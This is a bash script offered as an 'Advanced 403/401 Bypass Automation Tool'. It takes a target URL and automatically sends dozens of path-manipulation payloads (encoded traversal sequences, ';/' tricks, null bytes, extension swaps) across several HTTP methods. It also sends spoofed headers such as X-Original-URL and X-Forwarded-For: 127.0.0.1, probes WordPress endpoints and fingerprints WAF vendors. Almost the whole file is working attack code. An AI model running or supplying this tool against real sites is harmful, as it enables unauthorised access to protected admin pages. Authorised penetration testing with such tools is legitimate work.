#!/usr/bin/env bash

# =========================================================
# Advanced 403/401 Bypass Automation Tool
# Author: YourName
#
# Usage:
#   ./bypass.sh https://target.com/admin
#
# Example:
#   ./bypass.sh https://example.com/wp-admin
#
# =========================================================

set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
NC='\033[0m'

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
TIMEOUT=10

banner() {

echo -e "${CYAN}"

cat << "EOF"

██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
██████╔╝   ██║   ██║     ██║  ██║███████║███████║
╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝

      Advanced 403/401 Bypass Automation

EOF

echo -e "${NC}"
}

usage() {

echo "Usage:"
echo "./bypass.sh https://target.com/admin"
exit 1
}

TARGET="${1:-}"

if [[ -z "$TARGET" ]]; then
    usage
fi

FULL="${TARGET%/}"

banner

echo -e "${GREEN}[+] Target:${NC} $FULL"
echo

BASE_STATUS=$(curl -sk \
    -A "$UA" \
    -o /dev/null \
    -w "%{http_code}" \
    --max-time $TIMEOUT \
    "$FULL")

BASE_SIZE=$(curl -sk \
    -A "$UA" \
    -o /dev/null \
    -w "%{size_download}" \
    --max-time $TIMEOUT \
    "$FULL")

echo -e "${BLUE}[Baseline]${NC} Status: ${BASE_STATUS} | Size: ${BASE_SIZE}"
echo

request() {

METHOD="$1"
URL="$2"
HEADER="${3:-}"

if [[ -n "$HEADER" ]]; then

    RESULT=$(curl -sk \
        -X "$METHOD" \
        -H "$HEADER" \
        -A "$UA" \
        --max-time $TIMEOUT \
        -o /dev/null \
        -w "%{http_code} %{size_download} %{redirect_url}" \
        "$URL")

else

    RESULT=$(curl -sk \
        -X "$METHOD" \
        -A "$UA" \
        --max-time $TIMEOUT \
        -o /dev/null \
        -w "%{http_code} %{size_download} %{redirect_url}" \
        "$URL")
fi

CODE=$(echo "$RESULT" | awk '{print $1}')
SIZE=$(echo "$RESULT" | awk '{print $2}')
REDIRECT=$(echo "$RESULT" | awk '{print $3}')

DIFF=$((SIZE - BASE_SIZE))
ABS_DIFF=${DIFF#-}

if [[ "$CODE" =~ ^(200|201|202|204)$ ]]; then
    COLOR=$GREEN
elif [[ "$CODE" =~ ^(301|302|307|308)$ ]]; then
    COLOR=$CYAN
elif [[ "$CODE" =~ ^(401|403)$ ]]; then
    COLOR=$RED
else
    COLOR=$YELLOW
fi

printf "${COLOR}[%-3s]${NC} %-7s Size:%-8s Diff:%-8s " \
"$CODE" "$METHOD" "$SIZE" "$ABS_DIFF"

if [[ -n "$HEADER" ]]; then
    printf "Header:[%s] " "$HEADER"
fi

printf "URL:%s\n" "$URL"

if [[ -n "$REDIRECT" ]]; then
    echo -e "      ${CYAN}↳ Redirect:${NC} $REDIRECT"
fi
}

echo -e "${GREEN}[+] Path Bypass Tests${NC}"
echo

PAYLOADS=(
"$FULL"
"$FULL/"
"$FULL//"
"$FULL/."
"$FULL..;/"
"$FULL;/"
"$FULL%20"
"$FULL%09"
"$FULL?"
"$FULL#"
"$FULL.html"
"$FULL.json"
"$FULL.php"
"$FULL/*"
"$FULL/?test"
"$FULL/%2e/"
"$FULL/%2e%2e/"
"$FULL/..;/"
"$FULL/%2e%2e%2f"
"$FULL/%252e/"
"$FULL/%252e%252e/"
"$FULL/%2f/"
"$FULL/%252f/"
"$FULL.;/"
"$FULL..%00/"
"$FULL~"
"$FULL/-"
)

METHODS=(
"GET"
"POST"
"HEAD"
"OPTIONS"
"TRACE"
)

for payload in "${PAYLOADS[@]}"; do
    for method in "${METHODS[@]}"; do
        request "$method" "$payload"
    done
done

echo
echo -e "${GREEN}[+] Header Bypass Tests${NC}"
echo

HEADERS=(
"X-Original-URL: /"
"X-Rewrite-URL: /"
"X-Custom-IP-Authorization: 127.0.0.1"
"X-Forwarded-For: 127.0.0.1"
"X-Forwarded-Host: 127.0.0.1"
"X-Host: 127.0.0.1"
"X-Remote-IP: 127.0.0.1"
"X-Originating-IP: 127.0.0.1"
"X-Client-IP: 127.0.0.1"
"Client-IP: 127.0.0.1"
"True-Client-IP: 127.0.0.1"
"CF-Connecting-IP: 127.0.0.1"
"Forwarded: for=127.0.0.1"
"Referer: https://127.0.0.1/"
)

for header in "${HEADERS[@]}"; do
    for method in "${METHODS[@]}"; do
        request "$method" "$FULL" "$header"
    done
done

echo
echo -e "${GREEN}[+] Interesting WordPress Endpoints${NC}"
echo

WP_ENDPOINTS=(
"/wp-login.php"
"/xmlrpc.php"
"/wp-json/"
"/wp-admin/admin-ajax.php"
"/readme.html"
"/license.txt"
)

BASE_DOMAIN=$(echo "$FULL" | awk -F/ '{print $1"//"$3}')

for endpoint in "${WP_ENDPOINTS[@]}"; do

    URL="${BASE_DOMAIN}${endpoint}"

    RESULT=$(curl -sk \
        -A "$UA" \
        -o /dev/null \
        -w "%{http_code} %{size_download}" \
        "$URL")

    CODE=$(echo "$RESULT" | awk '{print $1}')
    SIZE=$(echo "$RESULT" | awk '{print $2}')

    if [[ "$CODE" =~ ^(200|301|302|403)$ ]]; then
        echo -e "${GREEN}[${CODE}]${NC} Size:${SIZE} URL:${URL}"
    else
        echo -e "${YELLOW}[${CODE}]${NC} Size:${SIZE} URL:${URL}"
    fi
done

echo
echo -e "${GREEN}[+] WAF Detection${NC}"
echo

curl -sk -I "$FULL" | grep -Ei \
"cloudflare|akamai|imperva|sucuri|f5|incapsula|fortiweb|aws"

echo
echo -e "${GREEN}[+] Wayback Machine Check${NC}"
echo

if command -v jq &> /dev/null; then
    curl -s \
    "https://archive.org/wayback/available?url=${FULL}" | jq .
else
    curl -s \
    "https://archive.org/wayback/available?url=${FULL}"
fi

echo
echo -e "${GREEN}[+] Scan Completed${NC}"
